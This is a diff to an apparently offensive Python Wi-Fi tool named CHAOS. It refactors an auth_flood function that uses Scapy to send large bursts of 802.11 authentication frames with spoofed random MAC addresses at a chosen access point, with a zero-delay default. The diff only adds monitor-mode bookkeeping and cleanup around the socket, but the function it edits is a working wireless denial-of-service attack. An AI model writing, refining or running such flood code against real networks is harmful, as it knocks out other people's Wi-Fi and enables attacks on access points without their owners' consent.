@@ -23,6 +23,7 @@ from ..radio import (
     ensure_monitor_mode,
     get_mode,
     random_locally_administered_mac,
+    set_monitor_active,
 )
 
 
@@ -60,36 +61,40 @@ def auth_flood(
         log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- auth frames cannot transmit")
         return 0
 
+    set_monitor_active(iface, True)
     try:
-        sock = conf.L2socket(iface=iface)
-    except OSError as exc:
-        log(f"auth flood socket open failed: {exc}")
-        return 0
+        try:
+            sock = conf.L2socket(iface=iface)
+        except OSError as exc:
+            log(f"auth flood socket open failed: {exc}")
+            return 0
 
-    sent = 0
-    try:
-        for i in range(count):
-            if stop_event is not None and stop_event.is_set():
-                log(f"auth flood stopped after {sent} frame(s) -- stop requested")
-                return sent
-            src = random_locally_administered_mac()
-            pkt = craft_auth(bssid, src)
-            try:
-                sock.send(pkt)
-                sent += 1
-            except OSError as exc:
-                log(f"auth flood send failed after {sent} frame(s): {exc}")
-                return sent
-            log(f"auth request {i + 1}/{count} sent: {src} -> {bssid}")
-            # Always sleep, even at interval=0.0: this is a real
-            # time.sleep() syscall, not skipped like a falsy-guarded one
-            # would be, so it forces a GIL/scheduler yield every frame.
-            # Without it, a large count at interval=0 (CHAOS's own default)
-            # can run thousands of frames back-to-back with no yield point,
-            # starving a Tkinter GUI's polling loop on the same process --
-            # confirmed live, 2026-09-26 (CHAOS lag + a hang on Stop).
-            if i < count - 1:
-                time.sleep(interval)
+        sent = 0
+        try:
+            for i in range(count):
+                if stop_event is not None and stop_event.is_set():
+                    log(f"auth flood stopped after {sent} frame(s) -- stop requested")
+                    return sent
+                src = random_locally_administered_mac()
+                pkt = craft_auth(bssid, src)
+                try:
+                    sock.send(pkt)
+                    sent += 1
+                except OSError as exc:
+                    log(f"auth flood send failed after {sent} frame(s): {exc}")
+                    return sent
+                log(f"auth request {i + 1}/{count} sent: {src} -> {bssid}")
+                # Always sleep, even at interval=0.0: this is a real
+                # time.sleep() syscall, not skipped like a falsy-guarded one
+                # would be, so it forces a GIL/scheduler yield every frame.
+                # Without it, a large count at interval=0 (CHAOS's own default)
+                # can run thousands of frames back-to-back with no yield point,
+                # starving a Tkinter GUI's polling loop on the same process --
+                # confirmed live, 2026-09-26 (CHAOS lag + a hang on Stop).
+                if i < count - 1:
+                    time.sleep(interval)
+        finally:
+            sock.close()
+        return sent
     finally:
-        sock.close()
-    return sent
+        set_monitor_active(iface, False)
